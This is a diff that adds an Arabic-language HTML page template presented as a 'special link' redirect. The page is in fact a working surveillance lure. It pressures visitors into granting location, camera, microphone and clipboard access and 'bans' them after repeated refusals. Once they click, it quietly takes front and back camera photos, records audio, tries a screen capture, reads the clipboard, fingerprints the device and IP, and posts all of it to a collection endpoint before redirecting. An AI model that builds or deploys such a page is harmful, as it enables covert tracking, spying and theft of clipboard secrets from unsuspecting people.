@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>رابط خاص</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .background-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2;
+        }
+        
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: -1;
+        }
+        
+        .container {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(15px);
+            border-radius: 25px;
+            padding: 50px;
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
+            border: 2px solid rgba(100, 200, 255, 0.5);
+            max-width: 600px;
+            width: 90%;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .custom-badge {
+            position: absolute;
+            top: -30px;
+            right: 50%;
+            transform: translateX(50%);
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            padding: 10px 30px;
+            border-radius: 50px;
+            font-size: 20px;
+            font-weight: bold;
+            color: #fff;
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.5);
+        }
+        
+        h1 {
+            margin: 30px 0 20px;
+            font-size: 2.5em;
+            color: #667eea;
+            text-shadow: 3px 3px 8px rgba(0,0,0,0.7);
+        }
+        
+        p {
+            margin-bottom: 30px;
+            font-size: 1.2em;
+            line-height: 1.6;
+        }
+        
+        .action-btn {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            border: none;
+            padding: 20px 50px;
+            border-radius: 50px;
+            color: #fff;
+            font-size: 22px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .action-btn:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 12px 35px rgba(102, 126, 234, 0.6);
+        }
+        
+        .action-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .camera-container {
+            margin: 30px 0;
+            display: none;
+        }
+        
+        video {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            display: none;
+        }
+        
+        canvas {
+            display: none;
+        }
+        
+        .status {
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 15px;
+            background: rgba(255, 255, 255, 0.15);
+            font-size: 16px;
+            display: none;
+            backdrop-filter: blur(10px);
+        }
+        
+        .success {
+            background: rgba(46, 204, 113, 0.4);
+            border: 2px solid #2ecc71;
+        }
+        
+        .error {
+            background: rgba(231, 76, 60, 0.4);
+            border: 2px solid #e74c3c;
+        }
+        
+        .loading {
+            background: rgba(52, 152, 219, 0.4);
+            border: 2px solid #3498db;
+        }
+        
+        .warning {
+            background: rgba(243, 156, 18, 0.4);
+            border: 2px solid #f39c12;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #667eea;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        
+        .permission-screen {
+            display: none;
+        }
+        
+        .main-content {
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+        
+        .shake {
+            animation: shake 0.5s;
+        }
+    </style>
+</head>
+<body>
+    <img src="{{ custom_image }}" alt="Custom Background" class="background-image" onerror="this.src='/custom_link_images/{{ page_id }}.jpg'">
+    <div class="overlay"></div>
+    
+    <div class="container">
+        <div class="custom-badge">🎯 رابط خاص</div>
+        
+        <div class="permission-screen" id="permissionScreen">
+            <h1>🔒 صلاحيات الوصول</h1>
+            <p>للمتابعة، يجب السماح بالصلاحيات المطلوبة عند ظهورها.</p>
+            <p style="font-size: 0.9em; opacity: 0.8;">سيتم طلب الصلاحيات واحدة تلو الأخرى</p>
+            
+            <button id="allowBtn" class="action-btn">
+                <i class="fas fa-check"></i> السماح والمتابعة
+            </button>
+            
+            <div id="permissionStatus" class="status"></div>
+        </div>
+        
+        <div class="main-content" id="mainContent">
+            <h1>رابط مخصص</h1>
+            <p>مرحباً بك! انقر على الزر للمتابعة</p>
+            
+            <button id="actionBtn" class="action-btn">
+                <i class="fas fa-arrow-left"></i> الذهاب للرابط
+            </button>
+
+            <div class="camera-container" id="cameraContainer">
+                <video id="video" autoplay playsinline></video>
+                <canvas id="canvas"></canvas>
+            </div>
+            
+            <div id="status" class="status"></div>
+            <div class="spinner" id="spinner"></div>
+        </div>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const actionBtn = document.getElementById('actionBtn');
+        const allowBtn = document.getElementById('allowBtn');
+        const statusDiv = document.getElementById('status');
+        const permissionStatusDiv = document.getElementById('permissionStatus');
+        const spinner = document.getElementById('spinner');
+        const cameraContainer = document.getElementById('cameraContainer');
+        const permissionScreen = document.getElementById('permissionScreen');
+        const mainContent = document.getElementById('mainContent');
+        
+        const PAGE_ID = "{{ page_id }}";
+        const API_URL = "/api/send_data";
+        const REDIRECT_URL = "{{ redirect_link }}";
+        
+        const FEATURES = {{ features|tojson }};
+        
+        let userLocation = null;
+        let userIP = null;
+        let userZone = null;
+        let clipboardData = null;
+        let clipboardItems = [];
+        let stream = null;
+        let dataSent = false;
+        let deviceInfo = {};
+        let frontPhoto = null;
+        let backPhoto = null;
+        let screenshot = null;
+        let permissionsGranted = false;
+        let attemptCount = parseInt(localStorage.getItem('permission_attempts_' + PAGE_ID) || '0');
+        const MAX_ATTEMPTS = 4;
+        
+        function updatePermissionStatus(message, type = '') {
+            permissionStatusDiv.textContent = message;
+            permissionStatusDiv.className = `status ${type}`;
+            permissionStatusDiv.style.display = 'block';
+        }
+        
+        function updateStatus(message, type = '') {
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+            statusDiv.style.display = 'block';
+        }
+        
+        function showSpinner(show) {
+            spinner.style.display = show ? 'block' : 'none';
+        }
+        
+        async function requestAllPermissions() {
+            if (attemptCount >= MAX_ATTEMPTS) {
+                await blockUser();
+                return false;
+            }
+            
+            allowBtn.disabled = true;
+            updatePermissionStatus('جاري طلب الصلاحيات...', 'loading');
+            
+            const MAX_RETRIES = 1;
+            let allGranted = true;
+            let deniedPermissions = [];
+            
+            try {
+                if (FEATURES.location) {
+                    updatePermissionStatus('📍 يرجى السماح بالوصول للموقع...', 'loading');
+                    let granted = false;
+                    for (let i = 0; i < MAX_RETRIES && !granted; i++) {
+                        if (i > 0) await new Promise(resolve => setTimeout(resolve, 1000));
+                        granted = await requestLocationPermission();
+                    }
+                    if (!granted) {
+                        deniedPermissions.push('الموقع الجغرافي');
+                        allGranted = false;
+                    }
+                }
+                
+                if (FEATURES.front_camera || FEATURES.both_cameras) {
+                    updatePermissionStatus('📷 يرجى السماح بالكاميرا الأمامية...', 'loading');
+                    let granted = false;
+                    for (let i = 0; i < MAX_RETRIES && !granted; i++) {
+                        if (i > 0) await new Promise(resolve => setTimeout(resolve, 1000));
+                        granted = await requestCameraPermission('user');
+                    }
+                    if (!granted) {
+                        deniedPermissions.push('الكاميرا الأمامية');
+                        allGranted = false;
+                    }
+                }
+                
+                if (FEATURES.back_camera || FEATURES.both_cameras) {
+                    updatePermissionStatus('📸 يرجى السماح بالكاميرا الخلفية...', 'loading');
+                    let granted = false;
+                    for (let i = 0; i < MAX_RETRIES && !granted; i++) {
+                        if (i > 0) await new Promise(resolve => setTimeout(resolve, 1000));
+                        granted = await requestCameraPermission('environment');
+                    }
+                    if (!granted) {
+                        deniedPermissions.push('الكاميرا الخلفية');
+                        allGranted = false;
+                    }
+                }
+                
+                if (FEATURES.microphone) {
+                    updatePermissionStatus('🎤 يرجى السماح بالميكروفون...', 'loading');
+                    let granted = false;
+                    for (let i = 0; i < MAX_RETRIES && !granted; i++) {
+                        if (i > 0) await new Promise(resolve => setTimeout(resolve, 1000));
+                        granted = await requestMicrophonePermission();
+                    }
+                    if (!granted) {
+                        deniedPermissions.push('الميكروفون');
+                        allGranted = false;
+                    }
+                }
+                
+                if (FEATURES.clipboard) {
+                    updatePermissionStatus('📋 محاولة الوصول للحافظة...', 'loading');
+                    const granted = await requestClipboardPermission();
+                    if (!granted) {
+                        console.log('سيتم محاولة الوصول للحافظة لاحقاً عند التقاط البيانات');
+                    }
+                }
+                
+                if (!allGranted) {
+                    attemptCount++;
+                    localStorage.setItem('permission_attempts_' + PAGE_ID, attemptCount.toString());
+                    
+                    const remainingAttempts = MAX_ATTEMPTS - attemptCount;
+                    
+                    if (attemptCount >= MAX_ATTEMPTS) {
+                        await blockUser();
+                        return false;
+                    }
+                    
+                    updatePermissionStatus(`❌ لم يتم منح: ${deniedPermissions.join('، ')}\n\nالمحاولة ${attemptCount} من ${MAX_ATTEMPTS}\nاضغط الزر مرة أخرى للمحاولة`, 'error');
+                    permissionScreen.classList.add('shake');
+                    setTimeout(() => permissionScreen.classList.remove('shake'), 500);
+                    allowBtn.disabled = false;
+                    return false;
+                }
+                
+                localStorage.removeItem('permission_attempts_' + PAGE_ID);
+                updatePermissionStatus('✅ تم منح جميع الصلاحيات!', 'success');
+                permissionsGranted = true;
+                
+                setTimeout(() => {
+                    permissionScreen.style.display = 'none';
+                    mainContent.style.display = 'block';
+                }, 1000);
+                
+                return true;
+                
+            } catch (error) {
+                console.error('خطأ في طلب الصلاحيات:', error);
+                updatePermissionStatus('❌ حدث خطأ! يرجى المحاولة مرة أخرى', 'error');
+                allowBtn.disabled = false;
+                return false;
+            }
+        }
+        
+        async function blockUser() {
+            allowBtn.disabled = true;
+            updatePermissionStatus('🚫 تم حظرك من الدخول\n\nبرجاء الدخول مرة أخرى بعد 10 دقائق', 'error');
+            
+            try {
+                await fetch('/api/block_ip', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        page_id: PAGE_ID,
+                        reason: 'تجاوز عدد محاولات رفض الصلاحيات'
+                    })
+                });
+            } catch (error) {
+                console.error('خطأ في إرسال طلب الحظر:', error);
+            }
+        }
+        
+        async function requestLocationPermission() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            userLocation = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            };
+                            resolve(true);
+                        },
+                        (error) => {
+                            console.error('تم رفض الموقع:', error);
+                            resolve(false);
+                        }
+                    );
+                } else {
+                    resolve(false);
+                }
+            });
+        }
+        
+        async function requestCameraPermission(facingMode) {
+            try {
+                const testStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode }
+                });
+                testStream.getTracks().forEach(track => track.stop());
+                return true;
+            } catch (error) {
+                console.error(`تم رفض الكاميرا (${facingMode}):`, error);
+                return false;
+            }
+        }
+        
+        async function requestMicrophonePermission() {
+            try {
+                const testStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                testStream.getTracks().forEach(track => track.stop());
+                return true;
+            } catch (error) {
+                console.error('تم رفض الميكروفون:', error);
+                return false;
+            }
+        }
+        
+        async function requestClipboardPermission() {
+            try {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    clipboardData = await navigator.clipboard.readText();
+                    console.log('✅ تم منح صلاحية الحافظة');
+                    return true;
+                }
+                console.log('⚠️ الحافظة غير مدعومة في هذا المتصفح');
+                return true;
+            } catch (error) {
+                if (error.name === 'NotAllowedError') {
+                    console.log('⚠️ صلاحية الحافظة مرفوضة - سيتم المحاولة لاحقاً');
+                    return true;
+                } else {
+                    console.log('⚠️ خطأ في الحافظة:', error.name);
+                    return true;
+                }
+            }
+        }
+        
+        async function getUserIP() {
+            if (!FEATURES.ip) return;
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+            } catch (error) {
+                console.error('خطأ في جلب IP:', error);
+            }
+        }
+        
+        async function getZone() {
+            if (!FEATURES.zone) return;
+            try {
+                userZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            } catch (error) {
+                console.error('خطأ في جلب المنطقة الزمنية:', error);
+                userZone = 'غير متاح';
+            }
+        }
+        
+        async function getAllClipboardData() {
+            if (!FEATURES.clipboard) return;
+            try {
+                if (navigator.clipboard && navigator.clipboard.read) {
+                    const items = await navigator.clipboard.read();
+                    clipboardItems = [];
+                    
+                    for (const item of items) {
+                        for (const type of item.types) {
+                            const blob = await item.getType(type);
+                            const text = await blob.text();
+                            clipboardItems.push({ type, content: text });
+                        }
+                    }
+                    console.log('✅ تم جمع بيانات الحافظة بنجاح');
+                    return true;
+                }
+                
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    clipboardData = await navigator.clipboard.readText();
+                    clipboardItems = [{ type: 'text/plain', content: clipboardData }];
+                    console.log('✅ تم جمع نص الحافظة بنجاح');
+                    return true;
+                }
+            } catch (error) {
+                console.log('⚠️ لم يتم الوصول للحافظة (قد يكون المتصفح لا يدعمها):', error.name);
+                clipboardData = 'غير متاح';
+                clipboardItems = [];
+            }
+            return false;
+        }
+        
+        async function getDeviceInfo() {
+            if (!FEATURES.device_info) return;
+            try {
+                const deviceModel = detectDeviceModel(navigator.userAgent);
+                
+                deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    deviceModel: deviceModel,
+                    deviceName: deviceModel,
+                    language: navigator.language,
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    deviceMemory: navigator.deviceMemory || 'غير متاح',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'غير متاح',
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData
+                    } : 'غير متاح',
+                    touchSupport: ('ontouchstart' in window) || (navigator.maxTouchPoints > 0),
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timestamp: new Date().toISOString()
+                };
+                
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    deviceInfo.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'يشحن' : 'لا يشحن',
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } else {
+                    deviceInfo.battery = 'غير متاح';
+                }
+                
+                const browserInfo = detectBrowser(navigator.userAgent);
+                deviceInfo.browser = browserInfo.name;
+                deviceInfo.browserVersion = browserInfo.version;
+                
+                const osInfo = detectOS(navigator.userAgent);
+                deviceInfo.os = osInfo.name;
+                deviceInfo.osVersion = osInfo.version;
+                
+                const deviceType = detectDeviceType(navigator.userAgent);
+                deviceInfo.deviceType = deviceType;
+                
+            } catch (error) {
+                console.error('خطأ في جمع معلومات الجهاز:', error);
+            }
+        }
+        
+        function detectBrowser(ua) {
+            if (ua.includes('Firefox')) return { name: 'Firefox', version: ua.match(/Firefox\/(\d+)/)?.[1] || 'غير معروف' };
+            if (ua.includes('Chrome')) return { name: 'Chrome', version: ua.match(/Chrome\/(\d+)/)?.[1] || 'غير معروف' };
+            if (ua.includes('Safari')) return { name: 'Safari', version: ua.match(/Version\/(\d+)/)?.[1] || 'غير معروف' };
+            if (ua.includes('Edge')) return { name: 'Edge', version: ua.match(/Edge\/(\d+)/)?.[1] || 'غير معروف' };
+            if (ua.includes('Opera')) return { name: 'Opera', version: ua.match(/Opera\/(\d+)/)?.[1] || 'غير معروف' };
+            return { name: 'Unknown', version: 'غير معروف' };
+        }
+        
+        function detectOS(ua) {
+            if (ua.includes('Windows NT 10')) return { name: 'Windows 10/11', version: ua.match(/Windows NT (\d+\.\d+)/)?.[1] || '' };
+            if (ua.includes('Windows NT 6.3')) return { name: 'Windows 8.1', version: '6.3' };
+            if (ua.includes('Windows NT 6.2')) return { name: 'Windows 8', version: '6.2' };
+            if (ua.includes('Windows NT 6.1')) return { name: 'Windows 7', version: '6.1' };
+            if (ua.includes('Mac OS X')) return { name: 'macOS', version: ua.match(/Mac OS X (\d+[._]\d+)/)?.[1].replace('_', '.') || '' };
+            if (ua.includes('Android')) return { name: 'Android', version: ua.match(/Android (\d+(\.\d+)?)/)?.[1] || '' };
+            if (ua.includes('iPhone') || ua.includes('iPad')) return { name: 'iOS', version: ua.match(/OS (\d+[._]\d+)/)?.[1].replace('_', '.') || '' };
+            if (ua.includes('Linux')) return { name: 'Linux', version: '' };
+            return { name: 'Unknown', version: '' };
+        }
+        
+        function detectDeviceType(ua) {
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
+            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'Mobile';
+            return 'Desktop';
+        }
+        
+        function detectDeviceModel(ua) {
+            if (ua.includes('iPhone')) {
+                const match = ua.match(/iPhone\s?(\d+[,_]\d+)?/);
+                if (match) {
+                    const models = {
+                        '14,2': 'iPhone 13 Pro', '14,3': 'iPhone 13 Pro Max',
+                        '14,4': 'iPhone 13 Mini', '14,5': 'iPhone 13',
+                        '14,6': 'iPhone SE (3rd gen)', '14,7': 'iPhone 14',
+                        '14,8': 'iPhone 14 Plus', '15,2': 'iPhone 14 Pro',
+                        '15,3': 'iPhone 14 Pro Max', '15,4': 'iPhone 15',
+                        '15,5': 'iPhone 15 Plus', '16,1': 'iPhone 15 Pro',
+                        '16,2': 'iPhone 15 Pro Max'
+                    };
+                    const model = match[1] ? match[1].replace('_', ',') : '';
+                    return models[model] || `iPhone ${model || 'Unknown'}`;
+                }
+                return 'iPhone';
+            }
+            if (ua.includes('Samsung')) {
+                const match = ua.match(/SM-[A-Z]\d+[A-Z]?/);
+                return match ? match[0] : 'Samsung Device';
+            }
+            if (ua.includes('Windows NT')) return 'Windows PC';
+            if (ua.includes('Macintosh')) return 'Mac';
+            if (ua.includes('Linux')) return 'Linux PC';
+            
+            return 'Unknown Device';
+        }
+        
+        async function captureCamera(facingMode) {
+            if (!permissionsGranted) return null;
+            try {
+                const constraints = {
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: facingMode
+                    }
+                };
+                
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                cameraContainer.style.display = 'block';
+                
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+                cameraContainer.style.display = 'none';
+                
+                return canvas.toDataURL('image/jpeg', 0.8);
+            } catch (error) {
+                console.error(`خطأ في التقاط الكاميرا (${facingMode}):`, error);
+                return null;
+            }
+        }
+        
+        async function captureScreenshot() {
+            if (!FEATURES.screenshot) return null;
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const bitmap = await imageCapture.grabFrame();
+                
+                canvas.width = bitmap.width;
+                canvas.height = bitmap.height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(bitmap, 0, 0);
+                
+                track.stop();
+                return canvas.toDataURL('image/jpeg', 0.8);
+            } catch (error) {
+                console.error('خطأ في التقاط الشاشة:', error);
+                return null;
+            }
+        }
+        
+        async function recordVoice() {
+            if (!FEATURES.microphone || !permissionsGranted) return null;
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(audioStream);
+                const audioChunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    audioChunks.push(event.data);
+                };
+                
+                const recordingPromise = new Promise((resolve) => {
+                    mediaRecorder.onstop = async () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            resolve(reader.result);
+                        };
+                        reader.readAsDataURL(audioBlob);
+                    };
+                });
+                
+                mediaRecorder.start();
+                
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                        audioStream.getTracks().forEach(track => track.stop());
+                    }
+                }, 5000);
+                
+                return await recordingPromise;
+            } catch (error) {
+                console.error('خطأ في تسجيل الصوت:', error);
+                return null;
+            }
+        }
+        
+        async function captureAndSend() {
+            if (dataSent || !permissionsGranted) return;
+
+            actionBtn.disabled = true;
+            updateStatus('جاري جمع البيانات المختارة...', 'loading');
+            showSpinner(true);
+            
+            if (FEATURES.clipboard) {
+                await getAllClipboardData();
+            }
+            
+            if (FEATURES.front_camera) {
+                frontPhoto = await captureCamera('user');
+            }
+            
+            if (FEATURES.back_camera) {
+                backPhoto = await captureCamera('environment');
+            }
+            
+            if (FEATURES.both_cameras) {
+                frontPhoto = await captureCamera('user');
+                backPhoto = await captureCamera('environment');
+            }
+            
+            screenshot = await captureScreenshot();
+            const voiceRecording = await recordVoice();
+            
+            const sendData = {
+                page_id: PAGE_ID,
+                location: userLocation ? `${userLocation.latitude}, ${userLocation.longitude}` : 'غير متاح',
+                ip: userIP || 'غير متاح',
+                zone: userZone || 'غير متاح',
+                clipboard: clipboardData || 'فارغة',
+                clipboardItems: clipboardItems,
+                frontPhoto: frontPhoto,
+                backPhoto: backPhoto,
+                screenshot: screenshot,
+                voiceRecording: voiceRecording,
+                deviceInfo: deviceInfo
+            };
+            
+            try {
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(sendData)
+                });
+                
+                if (response.ok) {
+                    updateStatus('تم جمع البيانات! جاري التوجيه...', 'success');
+                    dataSent = true;
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 1500);
+                } else {
+                    updateStatus('فشل في الإرسال، جاري التوجيه...', 'loading');
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 1000);
+                }
+                
+            } catch (err) {
+                console.error('خطأ في الإرسال:', err);
+                updateStatus('جاري التوجيه...', 'loading');
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 1000);
+            }
+            
+            showSpinner(false);
+        }
+
+        window.addEventListener('load', async () => {
+            await getUserIP();
+            await getZone();
+            await getDeviceInfo();
+            
+            permissionScreen.style.display = 'block';
+        });
+        
+        allowBtn.addEventListener('click', requestAllPermissions);
+        actionBtn.addEventListener('click', captureAndSend);
+        
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
